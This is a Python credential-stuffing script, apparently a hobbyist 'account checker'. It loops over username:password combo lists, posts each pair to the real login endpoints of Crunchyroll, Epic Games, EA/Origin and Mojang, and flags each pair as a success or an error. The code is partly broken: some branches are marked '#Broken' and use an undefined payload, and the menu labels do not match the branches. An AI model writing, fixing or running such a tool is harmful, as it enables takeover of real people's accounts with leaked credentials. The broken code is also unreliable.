import requests, urllib, sys, base64, json
from utils import cprint, log, listRemoveNewLines
from bs4 import BeautifulSoup as soup
def checker(clist: list):
    print(clist)
    clist = listRemoveNewLines(clist)
    print(clist)
    header = {"content-type": "application/json"}
    urls = ["https://www.crunchyroll.com/login", "https://www.epicgames.com/id/api/login", "https://signin.ea.com/p/originX/login?execution=e1390309168s1&initref=https%3A%2F%2Faccounts.ea.com%3A443%2Fconnect%2Fauth%3Fdisplay%3DoriginXWeb%252Flogin%26response_type%3Dcode%26release_type%3Dprod%26redirect_uri%3Dhttps%253A%252F%252Fwww.origin.com%252Fviews%252Flogin.html%26locale%3Dde_DE%26client_id%3DORIGIN_SPA_ID", "https://authserver.mojang.com/authenticate"]
    jesus = ["Crunchyroll", "Epic Games", "UPlay"]
    cprint(f"[1] {jesus[0]}\n[2] {jesus[1]} \n", "green")
    s = int(input("Enter Number for URL: "))
    if s == 1:
        for combo in clist: #Broken
            try:
                a = combo.split(":")
                user = a[0]
                pwd = a[1]
                with requests.Session() as s2:
                    p = s2.post(urls[0], data=payload)
                    log(f"[{combo}]{p.text}\n")
                    if "Incorrect login information" in p.text:
                        cprint(f"{combo} = ERROR\n", "red")
                    else:
                        cprint(f"{combo} = Success\n", "green")
            except Exception:
                pass

    elif s == 2: #Broken
        for combo in clist:
            try:
                a = combo.split(":")
                user = a[0]
                pwd = a[1]
                with requests.Session() as s2:
                    p = s2.post(urls[1], data=payload)
                    if "Incorrect login information" in p.text:
                        cprint(f"{a[0]}:{a[0]} = ERROR\n", "red")
                    else:
                        cprint(f"{a[0]}:{a[0]} = Success\n", "green")
            except Exception:
                pass

    elif s == 3:
        for combo in clist:
            try:
                a = combo.split(":")
                user = a[0]
                pwd = a[1]
                payload = {
                    "email": user,
                    "password": pwd,
                    "_rememberMe": "off",
                    "cid": ""
                }
                with requests.Session() as s1:
                    p = s1.post(urls[2], data=payload)
                if "Zugangsdaten fehlerhaft oder abgelaufen. Bitte erneut versuchen oder Passwort zurücksetzen." in p.text:
                    cprint(f"{a[0]}:{a[1]} | Error/Invalid", "red")
            except Exception:
                pass

    elif s == 4:
        for combo in clist:
            try:
                a = combo.split(":")
                user, pwd = a[0], a[1]
                body = json.dumps({
                    'agent': {
                        'name': 'Minecraft',
                        'version': 1
                    },
                    'username': user,
                    'password': pwd,
                    'clientToken': "fff"
                })
                r = requests.post(url=urls[3], headers=header, data=body)
                cprint(f"r.status_code\n", "purple")
            except Exception:
                pass
